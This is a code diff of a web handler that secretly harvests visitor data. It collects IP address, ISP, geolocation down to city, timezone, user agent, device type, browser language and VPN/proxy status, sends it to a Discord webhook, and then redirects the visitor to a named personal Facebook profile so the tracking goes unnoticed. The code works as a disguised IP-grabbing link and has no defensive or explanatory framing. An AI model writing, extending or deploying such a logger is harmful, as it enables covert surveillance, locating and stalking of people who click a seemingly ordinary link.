@@ -24,6 +24,17 @@ async function getIpDetails(ip) {
     }
 }
 
+// Function to determine the device type based on the User-Agent
+function detectDeviceType(userAgent) {
+    if (/Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
+        return "Mobile";
+    } else if (/Tablet|iPad/i.test(userAgent)) {
+        return "Tablet";
+    } else {
+        return "Desktop";
+    }
+}
+
 export default async function handler(req, res) {
     if (req.method === 'GET' || req.method === 'POST') {
         const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
@@ -43,12 +54,9 @@ export default async function handler(req, res) {
         // Gather additional information from request headers
         const userAgent = req.headers['user-agent'] || 'Unknown';
         const acceptLanguage = req.headers['accept-language'] || 'Unknown';
-        const acceptEncoding = req.headers['accept-encoding'] || 'Unknown';
-        const doNotTrack = req.headers['dnt'] === '1' ? 'Yes' : 'No';
-        const referer = req.headers['referer'] || 'No referer';
-
-        // Inferred network type based on IP geolocation data (basic inference)
-        const inferredNetworkType = ipDetails.mobile ? 'Mobile' : 'Broadband';
+        
+        // Detect the device type from the User-Agent
+        const deviceType = detectDeviceType(userAgent);
 
         // Prepare the message to send to Discord webhook
         const message = {
@@ -61,29 +69,26 @@ export default async function handler(req, res) {
                     fields: [
                         { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
                         { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
-                        { name: "Organization", value: `\`${ipDetails.org || "Unknown"}\``, inline: true },
-                        { name: "ASN", value: `\`${ipDetails.as || "Unknown"}\``, inline: true },
                         { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
                         { name: "Region", value: `\`${ipDetails.regionName || "Unknown"}\``, inline: true },
                         { name: "City", value: `\`${ipDetails.city || "Unknown"}\``, inline: true },
                         { name: "Timezone", value: `\`${ipDetails.timezone || "Unknown"}\``, inline: true },
-                        { name: "Latitude", value: `\`${ipDetails.lat || "Unknown"}\``, inline: true },
-                        { name: "Longitude", value: `\`${ipDetails.lon || "Unknown"}\``, inline: true },
                         { name: "Device Info", value: `\`${userAgent}\``, inline: false },
+                        { name: "Device Type", value: `\`${deviceType}\``, inline: true },
                         { name: "Browser Language", value: `\`${acceptLanguage}\``, inline: true },
-                        { name: "Network Type", value: `\`${inferredNetworkType}\``, inline: true },
-                        { name: "Is Proxy/VPN", value: `\`${ipDetails.proxy ? "Yes" : "No"}\``, inline: true },
-                        { name: "Is Hosting Provider", value: `\`${ipDetails.hosting ? "Yes" : "No"}\``, inline: true },
-                        { name: "Accept Encoding", value: `\`${acceptEncoding}\``, inline: true },
-                        { name: "Do Not Track", value: `\`${doNotTrack}\``, inline: true },
-                        { name: "Referer", value: `\`${referer}\``, inline: false }
+                        { name: "Network Type", value: `\`${ipDetails.mobile ? "Mobile" : "Broadband"}\``, inline: true },
+                        { name: "Using Proxy/VPN", value: `\`${ipDetails.proxy ? "Yes" : "No"}\``, inline: true },
+                        { name: "Hosting", value: `\`${ipDetails.hosting ? "Yes" : "No"}\``, inline: true }
                     ]
                 }
             ]
         };
 
+        // Send to the webhook and then redirect
         await sendToWebhook(message);
-        res.status(200).json({ message: "Device info logged." });
+        
+        res.writeHead(302, { Location: 'https://www.facebook.com/janethalejandra.gonzalez.7?mibextid=LQQJ4d' });
+        res.end();
     } else {
         res.status(405).send("Method Not Allowed");
     }
